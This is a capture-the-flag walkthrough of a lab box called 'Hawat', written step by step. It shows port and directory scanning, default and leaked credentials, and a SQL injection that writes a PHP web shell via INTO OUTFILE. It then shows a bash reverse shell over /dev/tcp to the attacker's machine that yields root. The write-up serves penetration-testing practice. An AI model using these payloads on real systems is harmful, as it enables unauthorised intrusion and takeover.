---
icon: ubuntu
---

# Hawat - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.214.147 -oN scans/nmap-tcp
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 16:11 EDT
Nmap scan report for 192.168.214.147
Host is up (0.029s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   http         Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Issue Tracker
30455/tcp open   http         nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: W3.CSS Template
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 5.0 (91%), Linux 3.10 - 4.11 (90%), Linux 3.2 - 4.14 (90%), Linux 2.6.32 - 3.10 (90%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   28.53 ms 192.168.45.1
2   29.43 ms 192.168.45.254
3   29.49 ms 192.168.251.1
4   29.51 ms 192.168.214.147
```

### <mark style="color:$primary;">HTTP PORT 50080</mark>

I am going to start directory busting, while checking out the website

```
feroxbuster -u http://192.168.214.147:50080
```

<figure><img src="../../.gitbook/assets/image (2129).png" alt=""><figcaption></figcaption></figure>

feroxbuster reveals an interesting endpoint, I am going to check it out

<figure><img src="../../.gitbook/assets/image (2130).png" alt=""><figcaption></figcaption></figure>

The site is using default admin:admin credentials

<figure><img src="../../.gitbook/assets/image (2131).png" alt=""><figcaption></figcaption></figure>

I find an issuetracker.zip file on the web application and download it to my machine. I took a look at the source code in the “IssueControler.java” file and found that Issue Tracker connects to a MySQL database and has a priority parameter. We also find a **`/issue/checkByPriority`** directory that may be vulnerable to SQL injection.

<figure><img src="../../.gitbook/assets/image (2133).png" alt=""><figcaption></figcaption></figure>

Descargar is the Download button, to get to the file followe the structure below

```
/issuetracker/src/main/java/com/issue/tracker/issues/issuetracker/src/main/java/com/issue/tracker/issues
```

<figure><img src="../../.gitbook/assets/image (2134).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2135).png" alt=""><figcaption></figcaption></figure>

This file leaks a couple of things first of all credentials **`issue_user:ManagementInsideOld797`**&#x20;

Issue tracker connects to the following MySQL database **`jdbc:mysql://localhost:3306/issue_tracker`**

We also discover that the priority parameter in **`/issue/checkByPriority`** directory is vulnerable to SQL injection.

<figure><img src="../../.gitbook/assets/image (2136).png" alt=""><figcaption></figcaption></figure>

Ok I am going to continue with enumerating Port 30455

### <mark style="color:$primary;">HTTP Port 30455</mark>

The main page is simply a static advertisment site, so I will be doing some directory busting in the hopes of uncovering something else:

```
dirsearch -u http://192.168.118.147:30455
```

<figure><img src="../../.gitbook/assets/image (1263).png" alt=""><figcaption></figcaption></figure>

Nice we found phpinfo.php! let's check it out

<figure><img src="../../.gitbook/assets/image (1264).png" alt=""><figcaption></figcaption></figure>

We found the web server's root directory at /srv/http. Thats is interesting!

I will continue my enumeration on port 17445.

### <mark style="color:$primary;">HTTP Port 17445</mark>

<figure><img src="../../.gitbook/assets/image (1265).png" alt=""><figcaption></figcaption></figure>

We found the issue Tracker webpage!

I am going to register an account and try to navigate to **`/issue/checkByPriority`** endpoint

<figure><img src="../../.gitbook/assets/image (1266).png" alt=""><figcaption></figcaption></figure>

I got a 405 status code method not allowed! I will open up burpsuite capture the request -> repeater and change the method to a POST and see if it works

<figure><img src="../../.gitbook/assets/image (1267).png" alt=""><figcaption></figcaption></figure>

Right click on the request and select Change request method

<figure><img src="../../.gitbook/assets/image (1268).png" alt=""><figcaption></figcaption></figure>

Ok after switching to a Post request the status code I am getting now its 400.

I am going to try SQL injection via the priority parameter mentioned in the IssueController.java file I discovered earlier! I will test it with a sleep request first

### <mark style="color:$primary;">SQLI Manual Code Execution</mark>

```
'+UNION+SELECT+sleep(5)+--+
```

<figure><img src="../../.gitbook/assets/image (1269).png" alt=""><figcaption></figcaption></figure>

SQLI confirmed! The page takes 5 seconds to respond!

Now I will try an RCE payload! Thanks to port 30455 I know where its root directory is at /srv/http. I am going to place a reverse php shell there and access it from the root directory

```
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/srv/http/rce.php" -- 
```

I used this website for URL encoding: [**cyberChef**](https://gchq.github.io/CyberChef/) Burpsuite was not url encoding properly

```
Normal'%20UNION%20SELECT%20%22%3C?php%20system($_GET%5B'cmd'%5D);%20?%3E%22%20INTO%20OUTFILE%20%22/srv/http/rce.php%22%20--%20
```

<figure><img src="../../.gitbook/assets/image (1270).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1271).png" alt=""><figcaption></figcaption></figure>

it seems like it worked let's check to see if rce.php is accessible from port 30455

<figure><img src="../../.gitbook/assets/image (1272).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell! I am going to use the below payload. You can url encoded on the same site or use Burpsuite!

```
bash -c 'bash -i >& /dev/tcp/192.168.45.158/17445 0>&1'
```

Url encoded payload:

<figure><img src="../../.gitbook/assets/image (1275).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready on your desired port before proceding with sending the request

<figure><img src="../../.gitbook/assets/image (1276).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1277).png" alt=""><figcaption></figcaption></figure>

We got a shell as root!
